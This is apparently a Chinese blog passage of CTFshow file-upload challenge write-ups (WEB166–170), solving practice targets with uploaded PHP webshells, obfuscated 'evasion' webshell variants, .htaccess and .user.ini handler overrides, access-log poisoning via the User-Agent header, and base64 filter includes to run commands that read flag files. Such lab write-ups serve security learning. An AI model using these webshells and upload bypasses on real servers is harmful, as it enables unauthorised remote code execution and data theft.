+<p><strong>语句： <code>&lt;?php @eval($_POST['flag']);?&gt;</code> </strong></p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/klYV8I00yoBbMfhF.png!thumbnail" alt=""></p>
+<p>上传成功，点击下载文件 bp 抓包</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TB7LHy1bJmXNDJEt.png!thumbnail" alt=""></p>
+<p>显示了上传路径，这里有两种获取 flag 的方式</p>
+<p>方法一：直接蚁剑 getshell</p>
+<p><strong>路径：</strong><span class="exturl" data-url="aHR0cDovLzU5NzJjNTJjLTI1NGMtNGQ3ZS04MzM4LWU3N2E1NjgyMzkwMS5jaGFsbGVuZ2UuY3RmLnNob3cvdXBsb2FkL2Rvd25sb2FkLnBocD9maWxlPWY5MzIyZDJjYmYxYjU5NWVkYTc4ZDQwZWI0Y2MyNjY1LnppcA==">http://5972c52c-254c-4d7e-8338-e77a56823901.challenge.ctf.show/upload/download.php?file=f9322d2cbf1b595eda78d40eb4cc2665.zip</span></p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DC31b871dxaj8ylv.png!thumbnail" alt=""></p>
+<p>在 /var/www/html/flag.php 下找到 flag</p>
+<p><strong>ctfshow{2aa24662-a040-4c85-8eba-7ca444b59198}</strong></p>
+<hr>
+<p>方法二：文件包含命令 cat flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/emkjdso9cd6eolFw.png!thumbnail" alt=""></p>
+<p><strong>路径：</strong><span class="exturl" data-url="aHR0cDovLzU5NzJjNTJjLTI1NGMtNGQ3ZS04MzM4LWU3N2E1NjgyMzkwMS5jaGFsbGVuZ2UuY3RmLnNob3cvdXBsb2FkL2Rvd25sb2FkLnBocD9maWxlPWY5MzIyZDJjYmYxYjU5NWVkYTc4ZDQwZWI0Y2MyNjY1LnppcA==">http://5972c52c-254c-4d7e-8338-e77a56823901.challenge.ctf.show/upload/download.php?file=f9322d2cbf1b595eda78d40eb4cc2665.zip</span></p>
+<p><strong>包含语句：flag=system (“tac …/f*”);phpinfo ();</strong></p>
+<p>bp 抓包发包获得 flag（比较稳）</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BZsXtNoF6f9ZkqeZ.png!thumbnail" alt=""></p>
+<p>也可以 hackbar 直接传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/49WQ3XVuJWGxQeCC.png!thumbnail" alt=""></p>
+<p>获得 flag</p>
+<p><strong>ctfshow{2aa24662-a040-4c85-8eba-7ca444b59198}</strong></p>
+<hr>
+<h1 id="web167"><a class="markdownIt-Anchor" href="#web167">#</a> <strong>WEB167</strong></h1>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rHxSUvhtSg2hC97a.png!thumbnail" alt=""></p>
+<p>看提示应该是和 apache 有关，而本题考察的知识点也就是上传.htaccess 绕过</p>
+<p>.htaccess 和.user.ini 的作用差不多，只不过.htaccess 使用范围仅限在 apache，两者起的都是解析作用</p>
+<p><strong>.htaccess：</strong></p>
+<p><strong>方式一：</strong></p>
+<p><strong>AddType application/x-httpd-php .png</strong></p>
+<p><strong>方式二：</strong></p>
+<p><strong>&lt;FilesMatch “png”&gt;</strong></p>
+<p><strong>SetHandler application/x-httpd-php</strong></p>
+<p><strong> <code>&lt;/FilesMatch&gt;</code> </strong></p>
+<p>开启环境，上传</p>
+<p>本题尝试了一下发现只能上传 jpg 格式的文件，不过不要紧，bp 抓包绕过</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Mpy3HBBFg6ISJZ20.png!thumbnail" alt=""></p>
+<p>接下来直接上传一句话木马</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZvqSscM2igX4YgZj.png!thumbnail" alt=""></p>
+<p>还是有两种方法，用 hackbar cat flag 和蚁剑 getshell</p>
+<p>方法一：</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mSRzW5vuX3OIZ966.png!thumbnail" alt=""></p>
+<p><strong>URL:</strong></p>
+<p><span class="exturl" data-url="aHR0cDovLzM0NmU2ZGU5LTc5ZGQtNDY1OC1iN2JiLTFkNGRkMTQxOTY2ZS5jaGFsbGVuZ2UuY3RmLnNob3cvdXBsb2FkL2ZsYWcucG5n">http://346e6de9-79dd-4658-b7bb-1d4dd141966e.challenge.ctf.show/upload/flag.png</span></p>
+<p><strong>POST data：</strong></p>
+<p><strong>flag=system(“tac …/f*”);phpinfo();</strong></p>
+<p>方法二：</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rplcd6HkrgXHSNNn.png!thumbnail" alt=""></p>
+<p>/var/www/html/flag.php 找到 flag</p>
+<p><strong>ctfshow{29c520eb-4ced-4f41-94e5-83e115a8ee3d}</strong></p>
+<hr>
+<h1 id="web168"><a class="markdownIt-Anchor" href="#web168">#</a> <strong>WEB168</strong></h1>
+<p>接下来所考察的都是免杀</p>
+<p><strong>一：</strong></p>
+<p><strong>&lt;?php</strong></p>
+<p><strong>$a = “s#y#s#t#e#m”;</strong></p>
+<p><strong>$b = explode(&quot;#&quot;,$a);</strong></p>
+<p><strong>$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</strong></p>
+<p><strong>$c($_REQUEST[1]);</strong></p>
+<p><strong>?&gt;</strong></p>
+<p><strong>二：</strong></p>
+<p><strong>&lt;?php</strong></p>
+<p><strong>$a=substr(‘1s’,1).‘ystem’;</strong></p>
+<p><strong>$a($_REQUEST[1]);</strong></p>
+<p><strong>?&gt;</strong></p>
+<p><strong>三：</strong></p>
+<p><strong>&lt;?php</strong></p>
+<p><strong>$a=strrev(‘metsys’);</strong></p>
+<p><strong>$a($_REQUEST[1]);</strong></p>
+<p><strong>?&gt;</strong></p>
+<p><strong>四：</strong></p>
+<p><strong>&lt;?php</strong></p>
+<p><strong>$a=$_REQUEST[‘a’];</strong></p>
+<p><strong>$b=$_REQUEST[‘b’];</strong></p>
+<p><strong>$a($b);</strong></p>
+<p><strong>?&gt;</strong></p>
+<p>打开环境，用 bp 抓包修改后缀为 php 上传免杀马</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0QPu1qzXQ0wbTKkz.png!thumbnail" alt=""></p>
+<p>成功</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0SS7ElSfZfvgSzVT.png!thumbnail" alt=""></p>
+<p>点击下载文件</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mD8MjBUKIp7BFUg2.png!thumbnail" alt=""></p>
+<p>看到了路径，但是这个路径并不对，真正的路径是 /upload/1.php</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cKu7FjNU07Egmpc6.png!thumbnail" alt=""></p>
+<p>直接 hackbar 进行命令执行</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VQZcSGJdSlBH95UV.png!thumbnail" alt=""></p>
+<p><strong>语句：</strong></p>
+<p><strong>1=tac …/f*</strong></p>
+<p>由于页面无法被渲染，所以真正的 flag 就会在页面的注释中体现，切换到查看器查看</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tlcSa7ZeddgcHk6J.png!thumbnail" alt=""></p>
+<p>得到 flag</p>
+<p><strong>ctfshow{cd195f91-8967-4b33-bde6-e09622bd78df}</strong></p>
+<hr>
+<h1 id="web169"><a class="markdownIt-Anchor" href="#web169">#</a> <strong>WEB169</strong></h1>
+<p>本题看了一些师傅的博客说是高级免杀，但是我没有成功</p>
+<p>这题可以用日志文件包含来做</p>
+<p>首先，要先来梳理一下题目上传的一些条件，经过尝试之后发现该题条件有：</p>
+<ol>
+<li>
+<p>只允许上传 zip 后缀的文件（因此要上传 zip 后抓包修改）</p>
+</li>
+<li>
+<p>类型只允许是 image/png（千万别忘记修改）<br>
+<strong>语句：</strong></p>
+</li>
+</ol>
+<p><strong>.user.ini：</strong></p>
+<p><strong>auto_append_file=/var/log/nginx/access.log</strong></p>
+<p><strong>（这里的路径可以加 &quot;&quot; 也可不加，一个不行时可以尝试另一个）</strong></p>
+<p><strong>UA 头：</strong></p>
+<p><strong> <code>&lt;?php @eval($_POST['flag']);?&gt;</code> </strong></p>
+<p>接下来就可以开始做题了</p>
+<p>这里我们先上传 user.ini，bp 抓包该类型和名称上传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/idmBax9cF76xmTXO.png!thumbnail" alt=""></p>
+<p>这里使用了.user.ini 直接包含日志文件</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MnM5seJiDGA6KnPl.png!thumbnail" alt=""></p>
+<p>成功，接着刷新页面 bp 抓包修改 UA 头</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6MZEYkgulB6ZQICG.png!thumbnail" alt=""></p>
+<p>修改为一句话，Forward</p>
+<p>接着随便上传一个 php 文件，待会直接用这个 php 进行 getshell</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sz68V0st7uf1WKSG.png!thumbnail" alt=""></p>
+<p>这里不需要木马文件，而且木马很容易被过滤，这里询问了下 web 师傅，做出的解释是.user.ini 要解析文件，上传目录下必须要有一个 php 文件，它才能发挥它的作用，因此我们随便传一个不带马的 php 上去即可</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gijuRAoPN7jTVCdN.png!thumbnail" alt=""></p>
+<p>成功，点击下载文件的路径并不是我们想要的路径，真正的路径是 /upload/1.php（我这里传上去的 php 名称是 1.php）</p>
+<p>方法一：蚁剑连接</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/awUff2w3rlM664FF.png!thumbnail" alt=""></p>
+<p>在 /var/www/html/flagaa.php 这个目录下找到 flag</p>
+<p>方法二：</p>
+<p>使用 hackbar 获取 flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ThMgExEFtygB6Lms.png!thumbnail" alt=""></p>
+<p>语句：flag=system (“tac …/f*”);phpinfo ();</p>
+<p>看到页面上的 flag_here 知道了又是无法被渲染，因此去查看器注释中寻找 flag</p>
+<p><strong>ctfshow{c486095a-95b3-4ae6-9763-dfb6da2cdc2a}</strong></p>
+<hr>
+<h1 id="web170"><a class="markdownIt-Anchor" href="#web170">#</a> <strong>WEB170</strong></h1>
+<p>本题方法如上 web169，同样的方法再试一遍即可依然是日志文件包含，这里就不过多记录了</p>
+<hr>
+<p>这里再记录下一种看到的骚姿势，这种姿势是关于上传.htaccess 进行解析的：</p>
+<p>引用其他师傅在 wp 中所做的解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果要上传 .htaccess 文件但有getimagesize、exif_imagetype函数的检查，可以用`#define width 1`和`#define height 1`定义：这样.htaccess文件既不会受到影响而失效，又能绕过检测</span><br><span class="line">.htaccess：</span><br><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType applocation/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ppp&quot;</span><br></pre></td></tr></table></figure>
+<p>.htaccess 还能配合伪协议的适用，解析已经上传的内容，那么上传的内容可以是 base64 编码后的，从而绕过敏感字符检查</p>
+<p><strong>语句：</strong></p>
+<p><strong>php_value auto_append_file<br>
+&quot;php://filter/convert.base64-decode/resource=./shell.ppp&quot;</strong></p>
+
+      <div class="tags">
+          <a href="/tags/WEB/" rel="tag"><i class="ic i-tag"></i> WEB</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2023-11-23 17:50:26" itemprop="dateModified" datetime="2023-11-23T17:50:26+08:00">2023-11-23</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="John Doe Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="John Doe PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/" title="CTFshow文件上传151-170">https://nnnpc.github.io/2024/04/16/CTFshow文件上传151-170/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url" rel="prev" data-background-image="&#x2F;&#x2F;img&#x2F;6.jpg" title="CTFshow文件包含">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> WEB</span>
+  <h3>CTFshow文件包含</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/" itemprop="url" rel="next" data-background-image="&#x2F;&#x2F;img&#x2F;6.jpg" title="CTFshow信息收集1-20">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> WEB</span>
+  <h3>CTFshow信息收集1-20</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web151"><span class="toc-number">1.</span> <span class="toc-text"> WEB151</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web152"><span class="toc-number">2.</span> <span class="toc-text"> WEB152</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web153"><span class="toc-number">3.</span> <span class="toc-text"> WEB153</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web154"><span class="toc-number">4.</span> <span class="toc-text"> WEB154</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web155"><span class="toc-number">5.</span> <span class="toc-text"> WEB155</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web156"><span class="toc-number">6.</span> <span class="toc-text"> WEB156</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web157"><span class="toc-number">7.</span> <span class="toc-text"> WEB157</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web158"><span class="toc-number">8.</span> <span class="toc-text"> WEB158</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web159"><span class="toc-number">9.</span> <span class="toc-text"> WEB159</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web160"><span class="toc-number">10.</span> <span class="toc-text"> WEB160</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web161"><span class="toc-number">11.</span> <span class="toc-text"> WEB161</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web162"><span class="toc-number">12.</span> <span class="toc-text"> WEB162</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web163"><span class="toc-number">13.</span> <span class="toc-text"> WEB163</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web164"><span class="toc-number">14.</span> <span class="toc-text"> WEB164</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web165"><span class="toc-number">15.</span> <span class="toc-text"> WEB165</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web166"><span class="toc-number">16.</span> <span class="toc-text"> WEB166</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web167"><span class="toc-number">17.</span> <span class="toc-text"> WEB167</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web168"><span class="toc-number">18.</span> <span class="toc-text"> WEB168</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web169"><span class="toc-number">19.</span> <span class="toc-text"> WEB169</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web170"><span class="toc-number">20.</span> <span class="toc-text"> WEB170</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2024/04/16/bugku%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1-2/" rel="bookmark" title="bugku文件包含1-2">bugku文件包含1-2</a></li><li><a href="/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="CTFshow命令执行">CTFshow命令执行</a></li><li><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="CTFshow文件包含">CTFshow文件包含</a></li><li class="active"><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/" rel="bookmark" title="CTFshow文件上传151-170">CTFshow文件上传151-170</a></li><li><a href="/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/" rel="bookmark" title="CTFshow信息收集1-20">CTFshow信息收集1-20</a></li><li><a href="/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/" rel="bookmark" title="SSTI学习">SSTI学习</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">62</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">7</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">7</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/python/" title="In python">python</a>
+</div>
+
+    <span><a href="/2024/04/16/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="被动信息收集">被动信息收集</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%B5%81%E9%87%8F/" title="In 流量">流量</a>
+</div>
+
+    <span><a href="/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/" title="哥斯拉v4.01流量浅析">哥斯拉v4.01流量浅析</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/WEB/" title="In WEB">WEB</a>
+</div>
+
+    <span><a href="/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/" title="CTFshow信息收集1-20">CTFshow信息收集1-20</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/python/" title="In python">python</a>
+</div>
+
+    <span><a href="/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B/" title="主动信息收集------敏感目录探测">主动信息收集------敏感目录探测</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/WEB/" title="In WEB">WEB</a>
+</div>
+
+    <span><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="CTFshow文件包含">CTFshow文件包含</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/GO/" title="In GO">GO</a>
+</div>
+
+    <span><a href="/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%88%9D%E5%AD%A6/" title="go语言初学">go语言初学</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MISC/" title="In MISC">MISC</a>
+</div>
+
+    <span><a href="/2024/04/16/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E5%86%B3%E8%B5%9B%20Misc/" title="2023浙江省决赛 Misc">2023浙江省决赛 Misc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%B8%97%E9%80%8F/" title="In 渗透">渗透</a>
+</div>
+
+    <span><a href="/2024/04/16/HTB%200%E5%B1%82/" title="HTB 0层">HTB 0层</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/python/" title="In python">python</a>
+</div>
+
+    <span><a href="/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%BA%8F%E5%88%97/" title="Python学习------序列">Python学习------序列</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%B5%81%E9%87%8F/" title="In 流量">流量</a>
+</div>
+
+    <span><a href="/2024/04/16/USB/" title="USB">USB</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ nnnpc</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/04/16/CTFshow文件上传151-170/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
